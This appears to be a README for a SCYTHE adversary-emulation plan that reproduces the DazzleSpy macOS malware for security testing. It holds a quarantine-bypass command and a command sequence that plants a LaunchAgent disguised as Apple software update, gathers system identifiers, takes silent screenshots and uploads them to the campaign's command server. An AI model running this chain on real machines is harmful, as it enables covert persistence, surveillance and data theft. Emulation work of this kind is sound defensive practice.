##DazzleSpy 

This threat is based on the [WeLiveSecure](https://www.welivesecurity.com/2022/01/25/watering-hole-deploys-new-macos-malware-dazzlespy-asia/) threat report released on January 25,2022. 

# Dazzle Spy 
1. Download and import the threats in JSON format to your SCYTHE instace
2. Download the Virtual File System (VFS) files under DazzleSpy/VFS. 
3. Upload the VFS file to your SCYTHE VFS in the following location: VFS:/shared/threats/DazzleSpy
4. Create a new campaign DazzleSpy with HTTPS and the communication option. You can import the `config.json` or manually add 
`--cp yourdomain.com:443 --secure true --multipart 10240 --heartbeat 5 --jitter 10` 
5. Import Existing Threat: *DazzleSpy*
6. Start Campaign
7. Download Campaign Client
7. In ~/Downloads run `chmod +x *.osx` and then run `sudo xattr =r =d com.apple.quareantine *.osx`
8. `./*.osx`


### To Emulate: 
```bash
loader --load downloader 
downloader --src VFS:/shared/threats/DazzleSpy/com.apple.softwareupdate.plist --dest /tmp/com.apple.softwareupdate.plist
loader --unload downloader
loader --load run
run mv /tmp/com.apple.softwareupdate.plist ~/Library/LaunchAgents/com.apple.softwareupdate.plist
run launchctl load ~/Library/LaunchAgents/com.apple.softwareupdate.plist #T1569
run whoami #T1033
run ioreg -d2 -c IOPlatformExpertDevice | awk -F\" '/IOPlatformUUID/{print $(NF-1)}'
run ioreg -l | grep IOPlatformSerialNumber #T1082
run df -h  #T1082
run sw_vers # T1082
run date #T1124
run /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -I | awk -F: '/ SSID/{print $2}' #T1016
run csrutil status #T1068
run id -G `whoami`
run ls -lah ~/Desktop ~/Documents ~/Downloads  #T1083
run ps aux # T1057
run screencapture -t png -x /tmp/monitor1.png /tmp/monitor2.png /tmp/monitor3.png /tmp/monitor4.png #T1113
loader --load uploader
uploader --remotepath /tmp/monitor1.png #T1041
uploader --remotepath /tmp/monitor2.png #T1041
uploader --remotepath /tmp/monitor3.png #T1041
uploader --remotepath /tmp/monitor4.png #T1041
loader --unload uploader
# Cleanup
run launchctl remove com.apple.softwareupdate
run rm ~/Library/LaunchAgents/com.apple.softwareupdate.plist
run rm /tmp/monitor*.png
loader --unload run
controller --shutdown
```

